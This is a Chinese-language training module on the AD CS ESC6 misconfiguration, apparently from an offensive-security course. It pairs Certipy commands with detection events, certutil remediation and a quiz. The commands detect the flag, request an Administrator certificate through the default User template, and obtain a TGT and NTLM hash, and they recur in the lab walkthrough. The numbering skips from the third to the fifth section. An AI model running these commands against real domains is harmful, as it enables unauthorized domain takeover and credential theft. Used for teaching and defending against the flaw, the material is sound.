# R17.5 全 CA 級請求屬性 SAN 簽發原則濫用分析 (CA-Wide SAN Policy Abuse / ESC6)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**全 CA 級主體別名 (SAN) 簽發原則濫用 (AD CS ESC6)** 是 Active Directory 憑證服務中最具隱蔽性與破壞力的「實例全域級」漏洞。其本質為：**「憑證授權單位 (CA) 在伺服器登錄檔中啟用了 `EDITF_ATTRIBUTESUBJECTALTNAME2` 旗標；此全域配置會直接覆蓋所有範本的安全限制——即使環境中所有的憑證範本都嚴格關閉了自訂 SAN (無 ESC1 條件)，CA 在簽發憑證時依然會盲目接受客戶端在 CSR 請求屬性中附加的自訂 SAN 參數；攻擊者只需使用系統預設最普通的 `User` 範本，即可簽發出任意網域管理員的數位憑證」**。

```
[低權限用戶 (operator)] ── 1. 向預設的 "User" 範本發起申請 (未開啟自訂 SAN)
       │                         │
       │                         └── 關鍵注入：在請求屬性中夾帶 san:upn=administrator@corp.internal
       ▼
[企業 CA 伺服器]
       │ ◄── 檢視註冊表發現啟用了 EDITF_ATTRIBUTESUBJECTALTNAME2 旗標！
       │
       ├── 2. CA 忽略範本設定，強制將請求屬性中的 SAN 壓印進憑證
       ▼
[攻擊者控制台] ◄── 3. 成功取得合法的 Administrator.pfx ─────────────────────────┘
       │
       ▼ 4. 發起 Kerberos PKINIT 換取 TGT ➔ 全域接管！
```

### 核心作戰決策與邊界
- **ESC6 核心威脅與判準**：
  - 弱點存在於 **CA 伺服器層級**，而非個別範本層級。
  - 只要 CA 具備該旗標，全網域中**任何支援用戶端驗證 (Client Auth) 且對一般使用者開放的範本（包括微軟出廠預設的 `User` 範本）**皆能瞬間被轉化為提權通道。
- **技術邊界**：
  - **與 ESC1 差異**：ESC1 必須找到特定配置了 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 的錯誤範本；ESC6 則是所有合法常規範本全數失守。

## 🔬 第一動：CA 政策旗標與登錄檔解剖 (Mechanics & PolicyFlags)

### 1. CA 政策登錄檔鍵值路徑
```text
HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyFlags
```

### 2. 核心旗標位元組與行為分析

| 旗標名稱 (Policy Flag) | 數值 (Hex) | 語意與底層行為 |
| :--- | :--- | :--- |
| **`EDITF_ATTRIBUTESUBJECTALTNAME2`** | `0x00040000` | **致命旗標**：指示 CA 政策模組在簽發憑證時，允許從客戶端傳入之請求屬性 (Request Attributes) 中提取並壓印自訂的 SAN。 |
| **標準安全預設值** | 不含 `0x00040000` | 嚴格忽略任何客戶端傳入之非預期 SAN 屬性，由範本與 AD 目錄決定主體。 |

## ⚡ 第二動：弱點驗證與字典級攻擊向量 (Attack Vectors)

### 核心利用指令速查表 (Certipy)

#### 1. 探測 CA 是否啟用 ESC6 旗標
```bash
certipy find -u "operator@corp.internal" -p "P@ssword123" -dc-ip 10.0.0.1 -vulnerable
# 檢視 CA 實例資訊區塊，若輸出中標記:
# [!] Vulnerabilities
#     ESC6: Enrollees can specify Subject Alternative Name (EDITF_ATTRIBUTESUBJECTALTNAME2)
# 則全網域直接淪陷！
```

#### 2. 利用標準 User 範本申請 Administrator 憑證
```bash
# 透過預設的 User 範本申請，利用 CA 旗標強行壓印 Administrator UPN
certipy req -u "operator@corp.internal" -p "P@ssword123" -ca "CORP-CA" \
    -template "User" -upn "administrator@corp.internal" -dc-ip 10.0.0.1
# 輸出: administrator.pfx
```

#### 3. 換取 Administrator 票據與 NTLM 雜湊
```bash
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
# 輸出: Administrator TGT 與 NTLM Hash
```

## 🥷 第三動：防禦規避與日誌鑑識特徵 (Evasion & Telemetry)

- **審計盲區規避**：
  - 許多企業僅使用 BloodHound 或自研腳本掃描「易受攻擊的憑證範本 (Certificate Templates)」，掃描結果全數綠色通過；但由於根本漏洞深植於 CA 登錄檔，攻擊者可肆無忌憚利用最標準的 `User` 範本突破防禦。
- **鑑識與遙測特徵**：
  - **CA 簽發審計 (Event ID 4887)**：簽發事件中，發行範本為最普通的 `User`，但其屬性清單中出現額外的 `Attributes` 欄位包含 `san:upn=administrator@corp.internal`。
  - **KDC 登入審計 (Event ID 4768)**：普通員工工作站突發使用 `administrator` 身分發起 PreAuth 16 (PKINIT) 登入。

## 🛡️ 第五動：安全加固與修復基線 (Hardening & Remediation Baseline)

### 1. 一鍵拔除 CA 伺服器危險旗標 (certutil 核心命令)
在 CA 伺服器上以本機管理員權限開啟 cmd/PowerShell：

```cmd
:: 1. 自政策模組中移除 EDITF_ATTRIBUTESUBJECTALTNAME2 旗標
certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2

:: 2. 重啟憑證服務以立即生效
net stop certsvc
net start certsvc
```

### 2. 驗證旗標已成功移除
```cmd
certutil -getreg policy\EditFlags
:: 確保輸出中的數值不再包含 EDITF_ATTRIBUTESUBJECTALTNAME2
```

## 🧪 實戰演練環境導引 (Hands-on Range Lab Walkthrough)

### 1. 靶場情境設定
- **網域**：`corp.internal`
- **CA 實例**：`CORP-CA` (因歷史系統相容性手動開啟了 `EDITF_ATTRIBUTESUBJECTALTNAME2`)
- **範本清單**：所有自訂範本皆已修正為安全配置，僅保留原廠預設的 `User` 範本。

### 2. 三步驗證流程

1. **驗證 CA 具備 ESC6 弱點**：
   ```bash
   certipy find -u "user1@corp.internal" -p "Password123" -dc-ip 10.0.0.1 -vulnerable | grep "ESC6"
   # 確認檢測到 ESC6: Enrollees can specify Subject Alternative Name
   ```
2. **藉由合法 User 範本注入管理員 SAN 獲取憑證**：
   ```bash
   certipy req -u "user1@corp.internal" -p "Password123" -ca "CORP-CA" \
       -template "User" -upn "Administrator@corp.internal" -dc-ip 10.0.0.1
   # 成功簽發 Administrator.pfx！
   ```
3. **安全加固後複測**：
   - 於 CA 上執行 `certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2` 並重啟服務；
   - 再次執行相同的 `certipy req` 命令，回顯：  
     `[-] Got error while trying to request certificate: Denied by Policy Module`，加固生效！

## 🎯 作戰驗收檢查點 (Mastery Checklist)

- [ ] **Q1. 為什麼說 ESC6 比 ESC1 更加危險且隱蔽？**  
  *分析思路*：ESC1 是單一範本的配置錯誤，修復該範本即可；ESC6 是 CA 實例全域登錄檔錯誤，它會無差別將全網域所有支援客戶端驗證的合法範本（包括預設的 User 範本）全數變成提權通道，且範本稽核工具會誤判為安全。

- [ ] **Q2. 企業歷史上往往因為何種業務需求而錯誤啟用了 `EDITF_ATTRIBUTESUBJECTALTNAME2`？**  
  *分析思路*：管理員為了方便給某些網路設備（如路由器、交換機）或多網域名稱 Web 伺服器申請包含多個自訂 SAN 的 SSL 憑證，圖方便在 CA 全域開啟了此參數，卻忽略了其對內部用戶端憑證的毀滅性後果。

- [ ] **Q3. 攻擊者在構造 ESC6 請求時，與常規憑證申請在封包內容上有何區別？**  
  *分析思路*：攻擊者在提交標準 CSR 的同時，在 HTTP/RPC 協議的「要求屬性 (Request Attributes)」欄位中附加了自訂字串 `san:upn=administrator@domain`，迫使 CA 覆蓋原主體。

- [ ] **Q4. 藍隊如何快速篩查企業內部所有 CA 實例是否受到 ESC6 威脅？**  
  *分析思路*：使用 `certutil -getreg policy\EditFlags` 檢查輸出是否包含 `EDITF_ATTRIBUTESUBJECTALTNAME2`，或使用 Certipy/BloodHound 進行全域 CA 標記枚舉。

- [ ] **Q5. 修復 ESC6 弱點的唯一標準步驟是什麼？**  
  *分析思路*：執行 `certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2` 並重啟 `certsvc` 服務。
